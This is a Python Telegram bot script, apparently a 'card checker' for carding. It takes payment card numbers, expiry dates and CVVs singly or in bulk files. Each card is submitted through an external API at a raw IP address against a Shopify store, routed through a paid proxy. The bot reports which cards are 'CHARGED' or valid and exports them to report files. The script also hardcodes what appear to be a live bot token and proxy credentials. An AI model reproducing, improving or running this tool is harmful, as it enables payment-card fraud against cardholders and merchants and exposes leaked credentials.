#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🤖 CARD CHECKER BOT
Single & Multi Check Only
"""

import os
import json
import time
import logging
import requests
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# ========================================
# 🔑 CONFIGURATION
# ========================================

# Telegram Token - YAHAN APNA TOKEN DALO
TELEGRAM_TOKEN = "8840844556:AAFAOAftQnGXovMQmXlPuaYsQdl0eYdgKWg"  # <-- @BotFather se lo

# Your API
API_URL = "http://216.250.119.63/"
SHOP_URL = "https://customsbyarrillc.myshopify.com"
PROXY = "ca-mon.pvdata.host:8080"
PROXY_USER = "g2rTXpNfPdcw2fzGtWKp62yH"
PROXY_PASS = "nizar1elad2"

# Admin IDs - Apne Telegram User IDs dalo
ADMIN_IDS = [123456789, 987654321]  # <-- @userinfobot se lo

# ========================================

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0}
results = []

# ========================================
# ADMIN CHECK
# ========================================

def admin_only(func):
    async def wrapper(update: Update, context: CallbackContext, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("⛔ *Access Denied!*", parse_mode='Markdown')
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# ========================================
# CARD CHECKER CLASS
# ========================================

class CardChecker:
    @staticmethod
    def check_card(number: str, mm: str, yy: str, cvv: str) -> dict:
        global stats
        
        card_data = f"{number}|{mm}|{yy}|{cvv}"
        full_url = f"{API_URL}?{card_data}&url={SHOP_URL}&proxy={PROXY}:{PROXY_USER}:{PROXY_PASS}"
        
        proxies = {
            "http": f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY}",
            "https": f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY}"
        }
        
        try:
            response = requests.get(full_url, proxies=proxies, timeout=30)
            stats["total"] += 1
            
            if response.status_code == 200:
                stats["valid"] += 1
                status = "✅ VALID"
                if "charged" in response.text.lower():
                    status = "💰 CHARGED"
            else:
                stats["invalid"] += 1
                status = "❌ INVALID"
                if response.status_code == 402:
                    status = "💳 DECLINED"
            
            result = {
                "card": number,
                "mm": mm,
                "yy": yy,
                "cvv": cvv,
                "status": status,
                "status_code": response.status_code,
                "response": response.text[:500],
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            results.append(result)
            return result
            
        except Exception as e:
            stats["errors"] += 1
            return {
                "card": number,
                "mm": mm,
                "yy": yy,
                "cvv": cvv,
                "status": "⚠️ ERROR",
                "error": str(e),
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
    
    @staticmethod
    def get_stats() -> str:
        success_rate = round((stats['valid']/stats['total']*100) if stats['total'] > 0 else 0, 2)
        return f"""
📊 *STATISTICS*
━━━━━━━━━━━━━━━━
📌 Total: {stats['total']}
💰 Charged: {stats['valid']}
❌ Invalid: {stats['invalid']}
⚠️ Errors: {stats['errors']}
━━━━━━━━━━━━━━━━
📈 Success: {success_rate}%
    """
    
    @staticmethod
    def save_results():
        if not results:
            return None
        filename = f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write("="*60 + "\n")
            f.write("CARD CHECKER RESULTS\n")
            f.write("="*60 + "\n\n")
            for r in results:
                f.write(f"[{r.get('timestamp', '')}] {r.get('status', '')} | {r.get('card', '')}|{r.get('mm', '')}|{r.get('yy', '')}|{r.get('cvv', '')}\n")
                f.write(f"Status Code: {r.get('status_code', 'N/A')}\n")
                f.write(f"Response: {r.get('response', '')[:200]}\n")
                f.write("-"*40 + "\n")
        return filename

# ========================================
# TELEGRAM HANDLERS
# ========================================

async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    is_admin = user_id in ADMIN_IDS
    
    keyboard = [
        ["/chk", "/mchk"],
        ["/stats", "/report"]
    ]
    
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    text = f"""
🤖 *CARD CHECKER BOT*

👤 User: {update.effective_user.first_name}
🔑 Role: {'👑 Admin' if is_admin else '👤 User'}

📌 *Commands:*
/chk  - Check single card
/mchk - Check multiple cards
/stats - Show statistics
/report - Get report file

📝 *Usage:*
Send card: `number|mm|yy|cvv`
Example: `4111111111111111|12|26|123`
    """
    await update.message.reply_text(text, parse_mode='Markdown', reply_markup=reply_markup)

async def chk_command(update: Update, context: CallbackContext):
    """/chk - Single card check"""
    await update.message.reply_text(
        "💳 *Send card in format:*\n`number|mm|yy|cvv`\n\nExample: `4111111111111111|12|26|123`",
        parse_mode='Markdown'
    )
    context.user_data['waiting_for_card'] = True

async def mchk_command(update: Update, context: CallbackContext):
    """/mchk - Multiple cards check"""
    text = """
📄 *Multiple Cards Check*

Send cards line by line:
`number|mm|yy|cvv`

Example:
`4111111111111111|12|26|123`
`5111111111111111|01|27|456`

Or send a .txt file
    """
    await update.message.reply_text(text, parse_mode='Markdown')
    context.user_data['waiting_for_multi'] = True

async def stats_command(update: Update, context: CallbackContext):
    """/stats - Show statistics"""
    await update.message.reply_text(CardChecker.get_stats(), parse_mode='Markdown')

async def report_command(update: Update, context: CallbackContext):
    """/report - Get report file"""
    if not results:
        await update.message.reply_text("📭 *No results to report!*", parse_mode='Markdown')
        return
    
    filename = CardChecker.save_results()
    if filename:
        with open(filename, 'rb') as f:
            await update.message.reply_document(f, filename=filename)
        os.remove(filename)

# ---------- PROCESS CARDS ----------

async def process_single_card(update: Update, text: str):
    """Process single card"""
    parts = text.split('|')
    
    if len(parts) != 4:
        await update.message.reply_text("❌ *Wrong format!* Need: `number|mm|yy|cvv`", parse_mode='Markdown')
        return
    
    number, mm, yy, cvv = [p.strip() for p in parts]
    
    # Validate
    if not (len(number) == 16 and len(mm) == 2 and len(yy) == 2 and len(cvv) == 3):
        await update.message.reply_text("❌ *Invalid!*\nCard: 16 digits\nMM: 2 digits\nYY: 2 digits\nCVV: 3 digits", parse_mode='Markdown')
        return
    
    await update.message.reply_text("🔄 *Checking card...*", parse_mode='Markdown')
    
    result = CardChecker.check_card(number, mm, yy, cvv)
    
    status = result.get('status', '')
    if "CHARGED" in status:
        emoji = "💰"
    elif "VALID" in status:
        emoji = "✅"
    elif "DECLINED" in status:
        emoji = "💳"
    else:
        emoji = "❌"
    
    response = f"""
{emoji} *{status}*
━━━━━━━━━━━━━━━━
💳 `{number}|{mm}|{yy}|{cvv}`
📊 Status Code: {result.get('status_code', 'N/A')}
📅 Time: {result.get('timestamp', '')}

📋 Response:
`{result.get('response', '')[:300]}`
    """
    await update.message.reply_text(response, parse_mode='Markdown')

async def process_multi_cards(update: Update, text: str):
    """Process multiple cards"""
    lines = [line.strip() for line in text.split('\n') if line.strip()]
    
    cards = []
    for line in lines:
        parts = line.split('|')
        if len(parts) == 4:
            cards.append(parts)
    
    if not cards:
        await update.message.reply_text("❌ *No valid cards found!*", parse_mode='Markdown')
        return
    
    await update.message.reply_text(f"📄 *Found {len(cards)} cards. Checking...*", parse_mode='Markdown')
    
    charged = 0
    valid = 0
    invalid = 0
    
    for i, (number, mm, yy, cvv) in enumerate(cards, 1):
        result = CardChecker.check_card(number, mm, yy, cvv)
        
        status = result.get('status', '')
        if "CHARGED" in status:
            charged += 1
            emoji = "💰"
        elif "VALID" in status:
            valid += 1
            emoji = "✅"
        else:
            invalid += 1
            emoji = "❌"
        
        await update.message.reply_text(f"{emoji} [{i}/{len(cards)}] `{number}` -> {status}", parse_mode='Markdown')
        time.sleep(0.5)
    
    # Summary
    summary = f"""
📊 *SUMMARY*
━━━━━━━━━━━━━━━━
📌 Total: {len(cards)}
💰 Charged: {charged}
✅ Valid: {valid}
❌ Invalid: {invalid}
    """
    await update.message.reply_text(summary, parse_mode='Markdown')

async def process_file(update: Update, context: CallbackContext):
    """Process uploaded file"""
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ *Please send a .txt file*", parse_mode='Markdown')
        return
    
    file = await document.get_file()
    file_path = f"temp_{document.file_name}"
    await file.download_to_drive(file_path)
    
    with open(file_path, 'r') as f:
        content = f.read()
    os.remove(file_path)
    
    await process_multi_cards(update, content)

# ---------- MESSAGE HANDLER ----------

async def handle_message(update: Update, context: CallbackContext):
    """Handle all messages"""
    text = update.message.text.strip()
    
    # Check if waiting for card
    if context.user_data.get('waiting_for_card'):
        await process_single_card(update, text)
        context.user_data['waiting_for_card'] = False
        return
    
    # Check if waiting for multi
    if context.user_data.get('waiting_for_multi'):
        await process_multi_cards(update, text)
        context.user_data['waiting_for_multi'] = False
        return
    
    # Check if document (file)
    if update.message.document:
        await process_file(update, context)
        return
    
    # Auto-detect card format
    if '|' in text:
        await process_single_card(update, text)
    else:
        await update.message.reply_text(
            "❌ *Invalid!*\nSend: `number|mm|yy|cvv` OR /chk OR /mchk",
            parse_mode='Markdown'
        )

async def error_handler(update: Update, context: CallbackContext):
    """Handle errors"""
    logger.error(f"Error: {context.error}")
    await update.message.reply_text("⚠️ *Something went wrong! Please try again.*", parse_mode='Markdown')

# ========================================
# MAIN
# ========================================

def main():
    print("="*60)
    print("🤖 CARD CHECKER BOT")
    print("="*60)
    print(f"🔑 Token: {TELEGRAM_TOKEN[:15]}...")
    print(f"🌐 API: {API_URL}")
    print(f"🏪 Store: {SHOP_URL}")
    print("="*60)
    print("✅ Bot is running!")
    print("📌 Commands: /chk, /mchk, /stats, /report")
    print("="*60)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("mchk", mchk_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("report", report_command))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, process_file))
    
    # Error handler
    app.add_error_handler(error_handler)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()